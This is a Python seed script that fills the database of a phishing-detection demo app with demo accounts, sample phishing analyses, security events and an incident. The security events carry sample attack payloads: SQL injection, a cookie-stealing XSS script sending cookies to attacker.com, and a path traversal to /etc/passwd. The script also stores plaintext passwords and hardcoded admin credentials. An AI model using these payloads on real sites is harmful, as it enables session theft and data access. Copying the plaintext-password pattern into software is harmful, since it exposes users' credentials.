import os
import sys
import uuid
import random
from datetime import datetime, timezone, timedelta

backend_dir = os.path.dirname(os.path.abspath(__file__))
if backend_dir not in sys.path:
    sys.path.insert(0, backend_dir)

from app.db.database import engine, Base
from app.db.models import UtilisateurStandard, Enqueteur, Administrateur, Incident, SecurityEvent, AnalysisRecord, Evidence, IncidentReport, AuditLog
from app.core.security import hash_password, generate_sha256_hash
from sqlalchemy.orm import Session

def seed():
    Base.metadata.create_all(bind=engine)
    session = Session(bind=engine)

    # 1. Check or create default users
    admin = session.query(Administrateur).filter_by(email="admin@phishguard.security").first()
    if not admin:
        admin = Administrateur(
            id=str(uuid.uuid4()),
            nom="System",
            prenom="Admin",
            email="admin@phishguard.security",
            hashed_password=hash_password("phishguard2026"),
            password_raw="phishguard2026",
            role="ADMINISTRATEUR",
            admin_level="SUPER_ADMIN"
        )
        session.add(admin)

    enqueteur = session.query(Enqueteur).filter_by(email="investigator@phishguard.security").first()
    if not enqueteur:
        enqueteur = Enqueteur(
            id=str(uuid.uuid4()),
            nom="Vance",
            prenom="Alex",
            email="investigator@phishguard.security",
            hashed_password=hash_password("phishguard2026"),
            password_raw="phishguard2026",
            role="ENQUETEUR",
            badge_number="SOC-8849",
            clearance_level="LEVEL_2_SOC",
            cases_resolved=12
        )
        session.add(enqueteur)

    user = session.query(UtilisateurStandard).filter_by(email="alice.martin@example.com").first()
    if not user:
        user = UtilisateurStandard(
            id=str(uuid.uuid4()),
            nom="Martin",
            prenom="Alice",
            email="alice.martin@example.com",
            hashed_password=hash_password("User123!"),
            password_raw="User123!",
            role="UTILISATEUR_STANDARD",
            scan_count=8
        )
        session.add(user)

    session.commit()

    # 2. Seed Sample Analysis Records if empty
    if session.query(AnalysisRecord).count() == 0:
        sample_scans = [
            ("http://paypal-security-login-auth.com/verify-account", "URL", "PHISHING", 92.5, "HIGH", 0.94),
            ("https://login.microsoftonline.com", "URL", "LEGITIMATE", 5.0, "LOW", 0.99),
            ("http://185.220.101.5/secure/update_billing.php", "URL", "MALICIOUS", 98.0, "CRITICAL", 0.97),
            ("URGENT: Your bank account has been suspended! Click http://bit.ly/claim-refund to restore access now.", "MESSAGE", "PHISHING", 88.4, "HIGH", 0.91),
            ("Bonjour Alice, votre relevé de compte bancaire de septembre est disponible sur l'espace client sécurisé.", "EMAIL", "LEGITIMATE", 12.0, "LOW", 0.95),
            ("http://secure-apple-id-verify.top/auth/login", "URL", "PHISHING", 94.2, "CRITICAL", 0.96),
            ("https://github.com/phishguard/security-suite", "URL", "LEGITIMATE", 2.1, "LOW", 0.99),
            ("ATTENTION: Interception de livraison Colissimo. Payez 1.99€ de douane ici: http://colis-suivi-frais.info", "MESSAGE", "PHISHING", 95.8, "CRITICAL", 0.98)
        ]

        for content, atype, verdict, rscore, rlevel, conf in sample_scans:
            code = f"ANL-{random.randint(100000, 999999)}"
            payload = {
                "analysis_code": code,
                "target_url": content,
                "verdict": verdict,
                "risk_score": rscore,
                "risk_level": rlevel,
                "ml_confidence": round(conf * 100, 1),
                "rule_triggers": ["Analyse de menaces heuristique effectuée"],
                "defensive_advice": ["Évitez de soumettre des identifiants sur cette page."]
            }
            ihash = generate_sha256_hash(payload)
            payload["integrity_hash"] = ihash

            rec = AnalysisRecord(
                id=str(uuid.uuid4()),
                user_id=user.id,
                analysis_code=code,
                analysis_type=atype,
                target_content=content,
                verdict=verdict,
                risk_score=rscore,
                risk_level=rlevel,
                ml_confidence=conf,
                details_json=payload,
                integrity_hash=ihash,
                created_at=datetime.now(timezone.utc) - timedelta(hours=random.randint(1, 48))
            )
            session.add(rec)
        session.commit()
        print("Successfully seeded AnalysisRecords!")

    # 3. Seed Security Events if few
    if session.query(SecurityEvent).count() < 3:
        events = [
            ("198.51.100.42", "POST", "/api/v1/auth/login", "SQLi", "CRITICAL", 0.98, "' UNION SELECT 1, password_hash FROM users --"),
            ("203.0.113.195", "GET", "/search?q=<script>alert('XSS')</script>", "XSS", "MEDIUM", 0.92, "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"),
            ("185.220.101.5", "POST", "/api/v1/auth/login", "BruteForce", "HIGH", 0.95, "Repeated 45 failed login attempts in 60s"),
            ("45.154.255.87", "GET", "/../../etc/passwd", "PathTraversal", "HIGH", 0.94, "../../../etc/passwd payload injection")
        ]
        for ip, method, path, atype, sev, conf, payload in events:
            ev = SecurityEvent(
                id=str(uuid.uuid4()),
                website_domain="phishguard-demo.sec",
                source_ip=ip,
                http_method=method,
                request_path=path,
                user_agent="Mozilla/5.0 (Security Scanner)",
                status_code=400 if "SQLi" in atype or "Traversal" in atype else 401,
                attack_type=atype,
                severity=sev,
                confidence=conf,
                evidence_payload=payload,
                ip_geo_info={"country": "United States" if "198" in ip else "Russia", "city": "Moscow" if "185" in ip else "New York", "asn": "AS13335", "is_vpn": True},
                timestamp=datetime.now(timezone.utc) - timedelta(minutes=random.randint(10, 300))
            )
            session.add(ev)
        session.commit()
        print("Successfully seeded SecurityEvents!")

    # 4. Seed Sample Incidents if few
    if session.query(Incident).count() < 2:
        inc = Incident(
            id=str(uuid.uuid4()),
            incident_code="INC-2026-0001",
            title="Campagne Phishing Impersonation PayPal",
            category="Phishing",
            severity="CRITICAL",
            status="INVESTIGATING",
            source_type="USER_REPORT",
            summary="Multiples attaques de collecte d'identifiants ciblées via des faux domaines PayPal.",
            evidence_hash="a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e",
            created_at=datetime.now(timezone.utc) - timedelta(days=1)
        )
        session.add(inc)

        ev_item = Evidence(
            id=str(uuid.uuid4()),
            incident_id=inc.id,
            evidence_type="URL_RAW",
            content="http://paypal-security-login-auth.com/verify-account",
            sha256_checksum="a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e"
        )
        session.add(ev_item)
        session.commit()
        print("Successfully seeded Incidents & Evidence!")

    session.close()

if __name__ == "__main__":
    seed()
